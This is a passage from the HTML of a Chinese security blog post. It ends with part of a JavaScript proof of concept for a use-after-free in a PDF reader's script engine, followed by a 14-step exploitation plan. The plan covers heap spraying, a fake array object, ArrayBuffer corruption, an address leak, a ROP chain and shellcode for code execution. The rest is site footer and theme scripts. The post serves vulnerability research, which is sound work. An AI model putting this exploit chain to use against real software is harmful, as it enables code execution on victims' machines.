class="comment">// Remove reference to the Data ESObject object, but its address is still in the object cache</span></span><br><span class="line">    <span class="keyword">this</span>.dataObjects[<span class="number">0</span>] = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger a GC which will free the Data ESObject (whose address is still in the object cache) and then trigger the UAF</span></span><br><span class="line">    g_timeout = app.setTimeOut(<span class="string">"triggerUAF()"</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">poc();</span><br></pre></td></tr></table></figure>
<p>利用思路：</p>
<ol>
<li>Spray a large number of ArrayBuffers so that one of them will likely be corrupted when we perform a write near the chosen address FAKE_ARRAY_JSOBJ_ADDR (later, step 9). Place crafted data into each ArrayBuffer so that at address FAKE_ARRAY_JSOBJ_ADDR there will be a fake JS array object. This fake array will be used when we perform the corruption later in steps 9 and 10.</li>
<li>Create a spray string containing the value FAKE_ARRAY_JSOBJ_ADDR</li>
<li>Prime the LFH for the ESObject size (0x48)</li>
<li>Trigger the creation of a Data ESObject which will be stored in the object cache</li>
<li>Remove the reference to the Data ESObject. Its address remains in the object cache</li>
<li>Trigger garbage collection, which will free the Data ESObject. Nevertheless, its address remains in the object cache</li>
<li>Overwrite the freed Data ESObject with the spray string containing FAKE_ARRAY_JSOBJ_ADDR</li>
<li>Access the freed Data ESObject in the object cache, assigning it into script variable fakeArrObj.Since the memory of the ESObject has been filled with FAKE_ARRAY_JSOBJ_ADDR, this value will be interpreted as the address of the corresponding JsObject. The fake array object presented there (see step 1) is then accessible to script via the variable fakeArrObj</li>
<li>Since fakeArrObj is located at FAKE_ARRAY_JSOBJ_ADDR and one of our sprayed ArrayBuffers is there, we can use fakeArrObj to overwrite an ArrayBuffer’s byteLength with 0xFFFFFFFF</li>
<li>Additionally, create an AcroForm text field and set it into an element of fakeArrObj. This writes a pointer to the text field into a location within the ArrayBuffer object. Later, this will be used for leaking the load address of AcroForm.api</li>
<li>Locate the corrupted ArrayBuffer among the ArrayBuffers that were created step 1</li>
<li>Prepare a DataView corresponding to the corrupted ArrayBuffer. This will be used for the read/write primitive</li>
<li>Prepare ROP chains and shellcode</li>
<li>Code execution: execute the ROP gadget via JSObject::setGeneric()</li>
</ol>

                
<p class="pink-link-context">
    <a href="/2020/08/04/FANS-Fuzzing-Android-Native-System-Services-via-Automated-Interface-Analysis/" rel="next" title="FANS: Fuzzing Android Native System Services via Automated Interface Analysis">
    Prev: FANS: Fuzzing Android Native System Services via Automated Interface Analysis
  </a>
</p>



<p class="pink-link-context">
    <a href="/2020/07/18/Structured-fuzzing-Android-s-NFC/" rel="next" title="【翻译】Structured fuzzing Android&#39;s NFC">
    Next: 【翻译】Structured fuzzing Android&#39;s NFC
  </a>
</p>


            </div>
			
        </div>
    </div>
</article>






</div>

        <div class="fixed-action-btn float-sitemap">
    <a class="btn-floating btn-large pink">
      <i class="fa fa-caret-square-o-up"></i>
    </a>
    <ul>
      <li><a class="btn-return-top btn-floating waves-effect pink" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
      <li><a class="btn-floating waves-effect button-collapse pink darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
    </ul>
  </div>

    </main>
    <footer class="page-footer pink accent-1 darken-1">
    
    <div class="footer-container container">
        <div class="row">
            
            <div class="social-group col m4 s12">
                <h5 class="white-text">Social</h5>
                
                    <a class="social-link" href="https://github.com/cracke-s-j" target="_blank">
                        <i class="fa fa-2x fa-github"></i>
                    </a>
                
                

            </div>
            

            
            <div class="col m8 s12">
                <h5 class="white-text">Links</h5>
                
                    <a class="social-link" href="https://blog.dyf.ink/" target="_blank">友情链接 dyf&#39;s blog</a>
                
            </div>
            
        </div>
    </div>
    

    <div class="footer-copyright pink-link-context">
        <div class="container">
            © 2020 ssj, All rights reserved.
            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
        </div>
    </div>
</footer>


    <noscript>
    <div class="noscript">
        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
    </div>
</noscript>
<div class="noscript">
    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
</div>


<script src="/js/jquery.min.js"></script>
<script src="/js/materialize.min.js"></script>

<script>
    (function($) {
        $(document).ready(function() {
            // 隐藏禁用javascript（针对微信内置浏览器）的提示
            $('.noscript').hide();

            // 图片缩放效果
            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');

            // 给图片加上点击放大效果（materialbox插件）
            $imgs.addClass('materialboxed').each(function(i, el) {
                $(this).attr('data-caption', $(this).attr('alt') || ' ');
            }).materialbox();

            // 优化表格的显示
            $('table').each(function() {
                var $table = $(this);
                // 除去多行代码的情况
                if ($table.find('pre').length == 0) {
                    $table.addClass('responsive-table striped bordered');
                }
            });

            // 首页幻灯片
            $('.slider').slider({indicators: true, full_width: true, interval: 8000});

            $(".button-collapse").sideNav();
            $(".category-menu").sideNav();

            // 针对gallery post
            $('.carousel').carousel({full_width: true});
            $('.carousel-control.prev').click(function() {
                $('.carousel').carousel('prev');
            });
            $('.carousel-control.next').click(function() {
                $('.carousel').carousel('next');
            });

            // 文章目录
            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();

            // 目录随屏幕滚动（防止目录过长越过footer）
            var $toc = $('.toc');
            var scrollTargetTop = 0;
            $(window).scroll(function() {
                var $activeLink = $toc.find('a.active.section');
                if ($(window).scrollTop() < 100) {
                    scrollTargetTop = 0;
                } else {
                    if ($activeLink[0]) {
                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
                    }
                }
                $toc.css('top', '-' + scrollTargetTop + 'px');
            });

            // 修正文章目录的left-border颜色
            var color = $('.table-of-contents-text').css('color');
            $('.table-of-contents-link').css('border-left-color', color);

            // 针对移动端做的优化：FAB按钮点击一下收回
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                $('.fixed-action-btn').addClass('click-to-toggle');
            }
            // 回到顶部
            $('.btn-return-top').click(function() {
                $('body, html').animate({
                    scrollTop: 0
                }, 500);
            });

            // 重置读书页面的Tab标签页的颜色
            $('li.tab a').hover(function() {
                $(this).toggleClass('text-lighten-4');
            });
            $('.indicator').addClass('pink lighten-2');

            
            // 添加new标签
            $('').append('<span class="new badge pink"></span>');
            

            // 搜索功能
            $('.modal-trigger').leanModal({
                // 打开搜索框时自动聚焦
                ready: function() {
                    if ($('#search').is(":visible")) {
                        $('#search-input').focus();
                    }
                }
            });
            var searchXml = "";
            if (searchXml.length == 0) {
             	searchXml = "search.xml";
            }
            var searchPath = "/" + searchXml;
            initSearch(searchPath, 'search-input', 'search-result');
        });

        // 初始化搜索与匹配函数
        var initSearch = function(path, search_id, content_id) {
            'use strict';
            $.ajax({
                url: path,
                dataType: "xml",
                success: function(xmlResponse) {
                    // get the contents from search data
                    var datas = $("entry", xmlResponse).map(function() {
                        return {
                            title: $("title", this).text(),
                            content: $("content", this).text(),
                            url: $("url", this).text()
                        };
                    }).get();
                    var $input = document.getElementById(search_id);
                    var $resultContent = document.getElementById(content_id);
                    $input.addEventListener('input', function() {
                        var str = '<ul class=\"search-result-list\">';
                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                        $resultContent.innerHTML = "";
                        if (this.value.trim().length <= 0) {
                            return;
                        }
                        // perform local searching
                        datas.forEach(function(data) {
                            var isMatch = true;
                            var content_index = [];
                            var data_title = data.title.trim().toLowerCase();
                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            // only match artiles with not empty titles and contents
                            if (data_title != '' && data_content != '') {
                                keywords.forEach(function(keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);
                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            }
                            // show search results
                            if (isMatch) {
                                keywords.forEach(function(keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                });

                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 100 characters
                                    var start = first_occur - 20;
                                    var end = first_occur + 80;
                                    if (start < 0) {
                                        start = 0;
                                    }
                                    if (start == 0) {
                                        end = 100;
                                    }
                                    if (end > content.length) {
                                        end = content.length;
                                    }
                                    var match_content = content.substring(start, end);
                                    // highlight all keywords
                                    keywords.forEach(function(keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
                                    });

                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        $resultContent.innerHTML = str;
                    });
                }
            });
        }
    })(jQuery);
</script>


<script src="/js/prettify.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
        $("pre").addClass("prettyprint");
        prettyPrint();
    });
</script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>
<script type="text/javascript" async
  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
</script>



<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":250,"height":500,"position":"left","hOffset":0,"vOffset":-100},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
